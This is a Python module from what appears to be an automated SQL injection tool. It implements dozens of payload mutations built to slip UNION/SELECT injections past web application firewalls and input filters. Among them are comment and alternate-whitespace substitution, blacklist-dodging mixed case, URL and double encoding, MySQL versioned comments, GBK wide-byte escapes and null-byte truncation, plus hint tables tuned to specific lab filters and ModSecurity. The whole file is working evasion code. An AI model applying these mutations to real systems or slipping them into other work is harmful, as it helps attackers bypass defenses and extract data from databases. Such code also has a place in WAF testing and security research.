"""
seqsqli/core/mutations.py
=========================
MutationEngine, MUTATIONS dict, ACTION_LIST, and FILTER_MUTATION_HINTS.
Each mutation is a pure function: str -> str.
"""

import random
import re
from typing import Dict, List

# Regex pattern matching any separator that mutations might insert between
# SQL keywords: real whitespace, %0a, %09, %0b, %0c, %0d, %a0, or /**/
_SQL_SEP = r'(?:\s|%0[a9bcd]|%0d%0a|%a0|/\*\*/)+'

class MutationEngine:
    """
    Applies transformations to SQL payloads.
    Each mutation is idempotent-safe — applying the same mutation twice
    won't further corrupt the payload.
    """

    @staticmethod
    def comment_space(payload: str) -> str:
        """Replace spaces with inline comments /**/"""
        return re.sub(r'(?<!/)(?<!\*) (?!\*/)(?!/)', '/**/', payload)

    @staticmethod
    def random_case(payload: str) -> str:
        """Randomize case of SQL keywords only.
        Avoids producing exact patterns commonly blacklisted:
        union/UNION/Union, select/SELECT/Select, etc."""
        # Exact casings that common blacklists strip
        _BLACKLISTED_CASES = {
            'union', 'UNION', 'Union',
            'select', 'SELECT', 'Select',
        }
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR',
                     'ORDER', 'BY', 'GROUP', 'HAVING', 'INSERT', 'UPDATE',
                     'DELETE', 'NULL', 'CONCAT', 'TABLE', 'DATABASE',
                     'INFORMATION_SCHEMA', 'LIMIT', 'LIKE']
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            def randomize_match(m, _bl=_BLACKLISTED_CASES):
                for _ in range(20):  # retry to avoid blacklisted casing
                    candidate = ''.join(
                        c.upper() if random.random() > 0.5 else c.lower()
                        for c in m.group()
                    )
                    if candidate not in _bl:
                        return candidate
                # fallback: force a safe mixed-case
                chars = list(m.group().lower())
                chars[1] = chars[1].upper()
                return ''.join(chars)
            result = pattern.sub(randomize_match, result)
        return result

    @staticmethod
    def url_encode_keywords(payload: str) -> str:
        """Partial URL-encode first char of SQL keywords."""
        replacements = {
            'UNION': '%55NION', 'union': '%55nion', 'Union': '%55nion',
            'SELECT': '%53ELECT', 'select': '%53elect', 'Select': '%53elect',
        }
        result = payload
        for old, new in replacements.items():
            result = result.replace(old, new)
        return result

    @staticmethod
    def keyword_split(payload: str) -> str:
        """Split SQL keywords with inline comments."""
        result = payload
        for kw_upper, kw_lower in [('UNION', 'union'), ('SELECT', 'select')]:
            for kw in [kw_upper, kw_lower, kw_upper.capitalize()]:
                if kw in result and f"/**/{kw[len(kw)//2:]}" not in result:
                    mid = len(kw) // 2
                    result = result.replace(kw, f"{kw[:mid]}/**/{kw[mid:]}")
        return result

    @staticmethod
    def double_encode(payload: str) -> str:
        """Double URL-encode spaces."""
        if "%2520" not in payload:
            return payload.replace(" ", "%2520")
        return payload

    @staticmethod
    def newline_space(payload: str) -> str:
        """Replace spaces with newline (%0a)."""
        if "%0a" not in payload.lower():
            return payload.replace(" ", "%0a")
        return payload

    @staticmethod
    def tab_space(payload: str) -> str:
        """Replace spaces with tab (%09)."""
        if "%09" not in payload:
            return payload.replace(" ", "%09")
        return payload

    @staticmethod
    def crlf_space(payload: str) -> str:
        """Replace spaces with CRLF (%0d%0a)."""
        if "%0d%0a" not in payload.lower():
            return payload.replace(" ", "%0d%0a")
        return payload

    @staticmethod
    @staticmethod
    def parenthesis_space(payload: str) -> str:
        """Use parentheses to avoid spaces: UNION(SELECT(1),(2),(3))"""
        result = payload
        # Match UNION <sep> SELECT <sep> cols <optional suffix>
        # <sep> can be space, %0a, %09, %0b, %0c, %a0, /**/
        _SEP = r'(?:\s|%0[a9bcd]|%a0|/\*\*/)+'
        # Try with comment suffix first
        m = re.search(r'(?i)(UNION)' + _SEP + r'(SELECT)' + _SEP + r'(.+?)(--.*)$', result)
        if not m:
            # Try without comment suffix (quote-closing)
            m = re.search(r'(?i)(UNION)' + _SEP + r'(SELECT)' + _SEP + r'(.+)$', result)
        if m:
            suffix_part = m.group(4) if m.lastindex >= 4 else ""
            cols = m.group(3).rstrip().split(',')
            wrapped = ','.join(f"({c.strip()})" for c in cols)
            result = f"{result[:m.start()]}{m.group(1)}(SELECT {wrapped}){suffix_part}"
        return result

    @staticmethod
    def versioned_comment(payload: str) -> str:
        """MySQL versioned comments /*!50000UNION*/"""
        if "/*!" in payload:
            return payload
        versions = ["50000", "50001", "50100", "40100"]
        ver = random.choice(versions)
        result = payload
        for kw in ['UNION', 'union', 'Union']:
            if kw in result:
                result = result.replace(kw, f"/*!{ver}{kw}*/")
                break
        for kw in ['SELECT', 'select', 'Select']:
            if kw in result:
                result = result.replace(kw, f"/*!{ver}{kw}*/")
                break
        return result

    @staticmethod
    def case_variation(payload: str) -> str:
        """Apply safe mixed-case patterns that dodge common exact-match filters.
        Avoids: union/UNION/Union, select/SELECT/Select."""
        # These specific casings survive blacklists that only strip the 3 common forms
        _SAFE_UNION  = ['uNion', 'uNIon', 'UnIoN', 'uNiOn', 'unION', 'UNIoN']
        _SAFE_SELECT = ['seLect', 'sElEcT', 'SeLeCt', 'sELEct', 'selECT', 'SELEcT']

        result = payload
        # Replace any casing of UNION — use lookahead/lookbehind that works
        # with %-encoded boundaries (e.g. %0aUNION%0a)
        m = re.search(r'(?i)(?<![a-zA-Z])(union)(?![a-zA-Z])', result)
        if not m:
            # Also try matching even without boundaries (e.g. inside %0aUNION%0a)
            m = re.search(r'(?i)(union)', result)
        if m:
            result = result[:m.start(1)] + random.choice(_SAFE_UNION) + result[m.end(1):]

        # Replace any casing of SELECT
        m = re.search(r'(?i)(?<![a-zA-Z])(select)(?![a-zA-Z])', result)
        if not m:
            m = re.search(r'(?i)(select)', result)
        if m:
            result = result[:m.start(1)] + random.choice(_SAFE_SELECT) + result[m.end(1):]

        return result

    @staticmethod
    def double_keyword_or(payload: str) -> str:
        """Bypass OR filter: OR -> || or OORR"""
        result = payload
        result = re.sub(r'\bOR\b', '||', result)
        result = re.sub(r'\bor\b', '||', result)
        return result

    @staticmethod
    def double_keyword_and(payload: str) -> str:
        """Bypass AND filter: AND -> && or AANDND"""
        result = payload
        result = re.sub(r'\bAND\b', '&&', result)
        result = re.sub(r'\band\b', '&&', result)
        return result

    @staticmethod
    def nested_or(payload: str) -> str:
        """Double-write to bypass recursive strip: OR -> OORR"""
        return re.sub(r'\bOR\b', 'OORR', payload, flags=re.IGNORECASE)

    @staticmethod
    def nested_and(payload: str) -> str:
        """Double-write to bypass recursive strip: AND -> AANDND"""
        return re.sub(r'\bAND\b', 'AANDND', payload, flags=re.IGNORECASE)

    @staticmethod
    def hex_encode_values(payload: str) -> str:
        """Hex-encode numeric values after SELECT."""
        m = re.search(r'(?i)SELECT' + _SQL_SEP + r'([\d,\s%0-9a-fA-F\'\"]+)', payload)
        if m:
            cols = m.group(1).split(',')
            hex_cols = []
            for c in cols:
                c = c.strip()
                if c.isdigit():
                    hex_cols.append(f"0x{c.encode().hex()}")
                else:
                    hex_cols.append(c)
            new_cols = ','.join(hex_cols)
            return payload[:m.start(1)] + new_cols + payload[m.end(1):]
        return payload

    @staticmethod
    def gbk_bypass(payload: str) -> str:
        """GBK wide-byte to eat backslash from addslashes."""
        if "%bf%27" in payload.lower() or "%bf'" in payload.lower():
            return payload
        return payload.replace("'", "%bf%27")

    @staticmethod
    def scientific_notation(payload: str) -> str:
        """Use scientific notation: 1 -> 1e0"""
        m = re.search(r'(?i)SELECT' + _SQL_SEP + r'([\d,\s%0-9a-fA-F\'\"]+)', payload)
        if m:
            cols = m.group(1).split(',')
            sci_cols = []
            for c in cols:
                c = c.strip()
                if c.isdigit():
                    sci_cols.append(f"{c}e0")
                else:
                    sci_cols.append(c)
            return payload[:m.start(1)] + ','.join(sci_cols) + payload[m.end(1):]
        return payload

    @staticmethod
    def concat_char(payload: str) -> str:
        """Replace string with CONCAT(CHAR()) encoding."""
        # Convert simple quoted strings to CHAR representation
        def replace_quoted(m):
            s = m.group(1)
            chars = ','.join(str(ord(c)) for c in s)
            return f"CONCAT(CHAR({chars}))"
        return re.sub(r"'([^']{1,20})'", replace_quoted, payload)

    @staticmethod
    def between_space(payload: str) -> str:
        """Use %a0 (non-breaking space) as space alternative."""
        if "%a0" not in payload.lower():
            return payload.replace(" ", "%a0")
        return payload

    @staticmethod
    def backtick_keyword(payload: str) -> str:
        """Wrap keywords in backticks for MySQL: `UNION` `SELECT`"""
        if "`" in payload:
            return payload
        for kw in ['UNION', 'union', 'SELECT', 'select']:
            if kw in payload:
                payload = payload.replace(kw, f"`{kw}`")
        return payload

    # =================================================================
    # NEW MUTATIONS — learned from real WAF bypass wordlists
    # =================================================================

    @staticmethod
    def hash_newline(payload: str) -> str:
        """Hash-comment + newline: union%23foo%0Aselect
        '#' comments out the rest of the line, %0a starts a fresh line."""
        if "%23" in payload:
            return payload
        junk = random.choice(["foo", "xyz", "aaa", "sqli"])
        # Case-insensitive: find UNION...SELECT with any separator
        result = re.sub(
            r'(?i)(union)(' + _SQL_SEP + r')(select)',
            lambda m: f"{m.group(1)}%23{junk}%0A{m.group(3)}",
            payload,
            count=1
        )
        return result

    @staticmethod
    def hash_newline_all(payload: str) -> str:
        """Replace ALL spaces with %23comment%0A.
        Pattern: +%23xyz%0AUnIOn%23xyz%0ASeLecT+"""
        if "%23" in payload:
            return payload
        junk = random.choice(["aa", "xx", "zz"])
        return payload.replace(" ", f"%23{junk}%0A")

    @staticmethod
    def char_split_comment(payload: str) -> str:
        """Split keyword chars into separate comments.
        Pattern: /*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/"""
        if "/*U*/" in payload or "/*u*/" in payload:
            return payload
        def split_kw(kw):
            return ''.join(f"/*{c}*/" for c in kw)
        result = payload
        for kw in ['UNION', 'union']:
            if kw in result:
                result = result.replace(kw, split_kw(kw))
                break
        for kw in ['SELECT', 'select']:
            if kw in result:
                result = result.replace(kw, split_kw(kw))
                break
        return result

    @staticmethod
    def versioned_00000(payload: str) -> str:
        """Versioned comment /*!00000Union*/ /*!00000Select*/"""
        if "/*!" in payload:
            return payload
        result = payload
        for kw in ['UNION', 'union', 'Union']:
            if kw in result:
                result = result.replace(kw, f"/*!00000{kw}*/")
                break
        for kw in ['SELECT', 'select', 'Select']:
            if kw in result:
                result = result.replace(kw, f"/*!00000{kw}*/")
                break
        return result

    @staticmethod
    def versioned_12345(payload: str) -> str:
        """Wrap entire UNION SELECT: /*!12345UNION SELECT*/"""
        if "/*!" in payload:
            return payload
        m = re.search(r'(?i)(UNION)' + _SQL_SEP + r'(SELECT)', payload)
        if m:
            return payload[:m.start()] + f"/*!12345{m.group(1)} {m.group(2)}*/" + payload[m.end():]
        return payload

    @staticmethod
    def plus_separator(payload: str) -> str:
        """Replace spaces with + (URL plus-space).
        Pattern: +union+select+1,2,3"""
        if "+" in payload and " " not in payload:
            return payload
        return payload.replace(" ", "+")

    @staticmethod
    def nested_union_select(payload: str) -> str:
        """Double-write keywords to survive recursive strip.
        Pattern: UNIunionON SELselectECT"""
        if "UNIunion" in payload or "SELselect" in payload:
            return payload
        result = payload
        for u in ['UNION', 'union']:
            if u in result:
                result = result.replace(u, "UNIunionON")
                break
        for s in ['SELECT', 'select']:
            if s in result:
                result = result.replace(s, "SELselectECT")
                break
        return result

    @staticmethod
    def vtab_space(payload: str) -> str:
        """Vertical tab %0b as space: union%0bselect"""
        if "%0b" not in payload.lower():
            return payload.replace(" ", "%0b")
        return payload

    @staticmethod
    def formfeed_space(payload: str) -> str:
        """Form feed %0c as space."""
        if "%0c" not in payload.lower():
            return payload.replace(" ", "%0c")
        return payload

    @staticmethod
    def distinct_inject(payload: str) -> str:
        """Insert DISTINCT/ALL between UNION and SELECT.
        Pattern: union+distinct+select / union+distinctROW+select"""
        if re.search(r'(?i)distinct', payload):
            return payload
        variant = random.choice(["DISTINCT", "DISTINCTROW", "ALL"])
        result = re.sub(
            r'(?i)(union)(' + _SQL_SEP + r')(select)',
            lambda m: f"{m.group(1)}{m.group(2)}{variant}{m.group(2)}{m.group(3)}",
            payload,
            count=1
        )
        return result

    @staticmethod
    def param_pollute_comment(payload: str) -> str:
        """Parameter-like content in comments to confuse WAF.
        Pattern: UNION/*&a=*/SELECT/*&a=*/"""
        if "/*&" in payload:
            return payload
        junk = random.choice(["&a=", "&x=1", "&id=", "&q="])
        return re.sub(
            r'(?i)(UNION|SELECT|FROM|WHERE|AND|OR|ORDER|BY)(' + _SQL_SEP + r')',
            lambda m: f"{m.group(1)}/*{junk}*/",
            payload
        )

    @staticmethod
    def versioned_urlenc_combo(payload: str) -> str:
        """Versioned comment + URL-encoded first char.
        Pattern: /*!50000%55nIoN*/ /*!50000%53eLeCt*/"""
        if "/*!" in payload:
            return payload
        ver = random.choice(["50000", "50001"])
        result = payload
        for kw in ['UNION', 'union', 'Union']:
            if kw in result:
                result = result.replace(kw, f"/*!{ver}%55{kw[1:]}*/")
                break
        for kw in ['SELECT', 'select', 'Select']:
            if kw in result:
                result = result.replace(kw, f"/*!{ver}%53{kw[1:]}*/")
                break
        return result

    @staticmethod
    @staticmethod
    def paren_full_wrap(payload: str) -> str:
        """Fully parenthesized no-space form: union(select(1),(2),(3))"""
        _SEP = r'(?:\s|%0[a9bcd]|%a0|/\*\*/)+'
        m = re.search(r'(?i)(UNION)' + _SEP + r'(SELECT)' + _SEP + r'([\d\w,\s\'\"]+?)(\s*--.*)$', payload)
        if not m:
            # Try without comment suffix (quote-closing payloads)
            m = re.search(r"(?i)(UNION)" + _SEP + r"(SELECT)" + _SEP + r"([\d\w,\s'\"]+)$", payload)
        if m:
            u, s, cols_str = m.group(1), m.group(2), m.group(3)
            suffix = m.group(4) if m.lastindex >= 4 else ""
            cols = [c.strip() for c in cols_str.split(',')]
            wrapped = ','.join(f"({c})" for c in cols)
            return f"{payload[:m.start()]}{u}({s} {wrapped}){suffix}"
        return payload

    @staticmethod
    def url_encode_mid_char(payload: str) -> str:
        """URL-encode a middle character: u%6eion se%6cect"""
        if "%6e" in payload.lower() or "%6c" in payload.lower():
            return payload
        result = payload
        for u in ['union', 'UNION', 'Union']:
            if u in result:
                mid = len(u) // 2
                c = u[mid]
                result = result.replace(u, f"{u[:mid]}%{ord(c):02x}{u[mid+1:]}")
                break
        for s in ['select', 'SELECT', 'Select']:
            if s in result:
                mid = len(s) // 2
                c = s[mid]
                result = result.replace(s, f"{s[:mid]}%{ord(c):02x}{s[mid+1:]}")
                break
        return result

    @staticmethod
    def mixed_versioned_newline(payload: str) -> str:
        """Versioned comments + newlines + URL-encoded chars.
        Pattern: %0A/*!50000%55nIoN*/all%0A/*!%53eLEct*/%0A"""
        if "/*!" in payload:
            return payload
        result = payload
        for u in ['UNION', 'union']:
            if u in result:
                result = result.replace(u, f"%0A/*!50000%55{u[1:]}*/")
                break
        for s in ['SELECT', 'select']:
            if s in result:
                result = result.replace(s, f"/*!%53{s[1:]}*/%0A")
                break
        return result

    @staticmethod
    def unhex_wrap(payload: str) -> str:
        """Wrap concat/group_concat in unhex(hex(...)) for extraction bypass.
        Pattern: unhex(hex(concat(table_name)))"""
        if 'unhex' in payload.lower():
            return payload
        for fn in ['CONCAT', 'concat', 'GROUP_CONCAT', 'group_concat']:
            if fn + '(' in payload:
                payload = payload.replace(f"{fn}(", f"unhex(hex({fn}(")
                # Close the extra wrapping at the matching paren
                idx = payload.rfind(')')
                if idx > 0:
                    payload = payload[:idx+1] + "))" + payload[idx+1:]
                break
        return payload

    @staticmethod
    def convert_charset(payload: str) -> str:
        """Wrap in CONVERT(... USING charset) for encoding bypass.
        Pattern: CONVERT(group_concat(table_name) USING latin1)"""
        if 'CONVERT' in payload or 'convert' in payload:
            return payload
        charset = random.choice(["latin1", "ascii", "utf8", "binary"])
        pattern = re.compile(r'((?:group_)?concat\([^)]*\))', re.IGNORECASE)
        m = pattern.search(payload)
        if m:
            return payload[:m.start()] + f"CONVERT({m.group(1)} USING {charset})" + payload[m.end():]
        return payload

    @staticmethod
    def double_url_encode_comment(payload: str) -> str:
        """Double URL-encode comment delimiters: %252f%252a = /* after double decode."""
        if "%252f" in payload:
            return payload
        return payload.replace("/**/", "%252f%252a*/")

    @staticmethod
    def null_byte(payload: str) -> str:
        """Append null-byte terminator: ...;%00
        Truncates downstream parsing in some WAF/parser pairs."""
        if "%00" in payload.lower():
            return payload
        # Strip trailing comment if present, then append ;%00
        stripped = re.sub(r'(--\s*-?|--\+|#)\s*$', '', payload).rstrip()
        return stripped + ";%00"

    @staticmethod
    def dot_prefix(payload: str) -> str:
        """Prepend scientific-notation-like dot prefix: .1 + payload.
        Exploits MySQL/libinjection parser divergence (SSQLi Fig.9 style)."""
        if payload.startswith("."):
            return payload
        return ".1" + payload


# Build action registry
MUTATIONS = {
    # --- Space replacement family ---
    "comment":           MutationEngine.comment_space,
    "newline":           MutationEngine.newline_space,
    "tab_space":         MutationEngine.tab_space,
    "crlf":              MutationEngine.crlf_space,
    "vtab":              MutationEngine.vtab_space,
    "formfeed":          MutationEngine.formfeed_space,
    "between_space":     MutationEngine.between_space,
    "plus_sep":          MutationEngine.plus_separator,
    "double_encode":     MutationEngine.double_encode,
    # --- Case manipulation ---
    "case":              MutationEngine.random_case,
    "case_split":        MutationEngine.case_variation,
    # --- URL encoding ---
    "url_encode":        MutationEngine.url_encode_keywords,
    "url_mid_char":      MutationEngine.url_encode_mid_char,
    # --- Keyword splitting / inline comment ---
    "keyword_split":     MutationEngine.keyword_split,
    "char_split":        MutationEngine.char_split_comment,
    # --- Versioned comments (different version numbers) ---
    "ver_50000":         MutationEngine.versioned_comment,
    "ver_00000":         MutationEngine.versioned_00000,
    "ver_12345":         MutationEngine.versioned_12345,
    "ver_urlenc":        MutationEngine.versioned_urlenc_combo,
    "ver_newline":       MutationEngine.mixed_versioned_newline,
    # --- Parenthesis wrapping ---
    "paren_space":       MutationEngine.parenthesis_space,
    "paren_full":        MutationEngine.paren_full_wrap,
    # --- Hash-comment + newline ---
    "hash_nl":           MutationEngine.hash_newline,
    "hash_nl_all":       MutationEngine.hash_newline_all,
    # --- Parameter pollution ---
    "param_pollute":     MutationEngine.param_pollute_comment,
    # --- Double-write (nested keyword bypass) ---
    "nested_or":         MutationEngine.nested_or,
    "nested_and":        MutationEngine.nested_and,
    "nested_union":      MutationEngine.nested_union_select,
    # --- Operator substitution ---
    "double_or":         MutationEngine.double_keyword_or,
    "double_and":        MutationEngine.double_keyword_and,
    # --- Value encoding ---
    "hex_encode":        MutationEngine.hex_encode_values,
    "scientific":        MutationEngine.scientific_notation,
    "concat_char":       MutationEngine.concat_char,
    # --- Extraction obfuscation ---
    "unhex_wrap":        MutationEngine.unhex_wrap,
    "convert_charset":   MutationEngine.convert_charset,
    # --- Keyword insertion ---
    "distinct":          MutationEngine.distinct_inject,
    # --- Special ---
    "gbk_bypass":        MutationEngine.gbk_bypass,
    "backtick":          MutationEngine.backtick_keyword,
    "dbl_url_comment":   MutationEngine.double_url_encode_comment,
    # --- Parser-divergence (manual-bypass discoveries vs ModSec) ---
    "null_byte":         MutationEngine.null_byte,
    "dot_prefix":        MutationEngine.dot_prefix,
}

ACTION_LIST = list(MUTATIONS.keys())

# Filter type -> relevant mutations (biased exploration)
FILTER_MUTATION_HINTS = {
    "none": [
        "comment", "case", "url_encode", "ver_50000",
    ],
    "or_and": [
        "double_or", "double_and", "nested_or", "nested_and",
        "hex_encode", "case", "nested_union",
    ],
    "comments_spaces_or_and": [
        "tab_space", "newline", "between_space", "vtab", "formfeed",
        "crlf", "paren_space", "paren_full", "plus_sep",
        "nested_or", "nested_and", "hex_encode",
        "hash_nl", "hash_nl_all",
    ],
    "union_select_comments_spaces": [
        # --- PRIORITY 1: case bypass for UNION/SELECT ---
        # Less-27 strips exact union/UNION/Union/select/SELECT/Select,
        # so mixed case (uNion, seLect) is the primary bypass.
        "case_split", "case_split", "case",
        # --- PRIORITY 2: whitespace bypass ---
        # Spaces and + are stripped; /*, --, # also stripped.
        # Use alternative whitespace: newline, tab, vtab, formfeed, %a0.
        "newline", "newline", "tab_space", "vtab", "formfeed",
        "between_space",
        # --- PRIORITY 3: value encoding ---
        "hex_encode",
    ],
    "union_select_combined": [
        "case_split", "case_split", "case",
        "newline", "newline", "tab_space", "vtab", "formfeed",
        "between_space",
        "hex_encode",
        "nested_union",
    ],
    "addslashes_gbk": [
        "gbk_bypass", "hex_encode", "url_encode",
    ],
    "unknown": ACTION_LIST[:15],  # broad exploration
}